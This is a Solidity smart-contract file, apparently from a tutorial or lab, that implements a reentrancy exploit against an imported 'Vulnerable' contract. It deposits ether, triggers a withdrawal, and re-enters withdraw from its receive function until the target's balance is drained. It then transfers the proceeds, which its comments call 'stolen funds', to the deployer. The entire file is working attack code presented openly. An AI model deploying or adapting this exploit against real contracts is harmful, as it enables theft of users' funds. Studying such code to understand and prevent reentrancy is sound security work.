// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerable.sol";

contract ReentrancyExploit {
    Vulnerable public vulnerableContract;
    address public owner;

    constructor(address _vulnerableAddress) {
        vulnerableContract = Vulnerable(_vulnerableAddress);
        owner = msg.sender;
    }

    // Start the attack by depositing and then triggering a withdrawal
    function attack() external payable {
        require(msg.value >= 1 ether, "Require at least 1 ether to attack");

        // Deposit initial funds into the vulnerable contract
        vulnerableContract.deposit{value: msg.value}();

        // Trigger the withdrawal process
        vulnerableContract.withdraw(msg.value);
    }

    // Fallback function called when receiving Ether from the vulnerable contract
    receive() external payable {
        if (address(vulnerableContract).balance > 0) {
            // Re-enter the withdraw function
            vulnerableContract.withdraw(msg.value);
        } else {
            // Transfer stolen funds to the attacker
            payable(owner).transfer(address(this).balance);
        }
    }

    // Function to withdraw stolen funds from this contract
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner can withdraw funds");
        payable(owner).transfer(address(this).balance);
    }
}
